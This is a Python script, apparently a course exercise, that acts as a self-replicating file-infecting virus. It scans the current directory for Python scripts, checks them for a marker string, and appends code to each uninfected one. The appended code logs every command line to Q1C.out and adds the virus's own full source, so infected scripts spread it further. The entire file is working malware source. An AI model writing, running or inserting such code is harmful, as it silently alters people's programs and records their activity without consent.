
import os
import subprocess
import sys

# reads a file in the current directory 
def file_output(directory_path):
    list = []
    files = os.listdir(directory_path)

    for file in files:
        list.append(file)
    return list

def file_read(filename):
    # Read the contents of the file into a list of lines
    with open(filename) as f:
        lines = [line.rstrip('\n') for line in f]
    return lines

def is_script(filename):
    with open(filename) as f:
        file_text = f.read()
    return "if __name__ == '__main__':" in file_text or 'if __name__ == "__main__":' in file_text

def validate_filename(filename):
    # Check if the filename ends with '.py'
    if not filename.endswith('.py'):
        print("Please provide a .py file.")
        return False
    return True

def virus_check(filename):
    # Check if the given file is a Python script
    with open(filename) as f:
        file_text = f.read()
    return "aint that just the way" in file_text

def add_virus(f): # writes spy code into file
    command_line = f"python3 {f}"
    with open('Q1C.out', 'a') as file:
        file.write(command_line + '\n')

    with open(f, 'a') as file:
        file.write('\n\n# Spyware added\n')
        file.write("import sys\n")
        file.write("command_line = ' '.join(sys.argv)\n")
        file.write("with open('Q1C.out', 'a') as output_file:\n")
        file.write("    output_file.write(command_line + '\\n')\n")
        file.write("print('Spyware executed successfully')\n")  # Add this line to check if spyware code is executed
        with open(__file__, "r") as file2:
            lines = file2.read()
        file.write(lines)
    print(f"Spyware successfully injected into '{f}'")

def main():
    current_dir = os.getcwd()
    files = os.listdir(current_dir)
    
    for file_name in files:
        file_path = os.path.join(current_dir, file_name)
        if validate_filename(file_name) and is_script(file_path) and file_name != "Q1C.py" and file_name != "Q1B.py":
            if not virus_check(file_path):
                print(f"{file_name} does not contain the virus.")
                add_virus(file_path)
                print(f"Virus added to {file_name}.")
            else:
                print(f"{file_name} already contains the virus.")
        else:
            print(f"{file_name} is not a valid Python script.")

main()







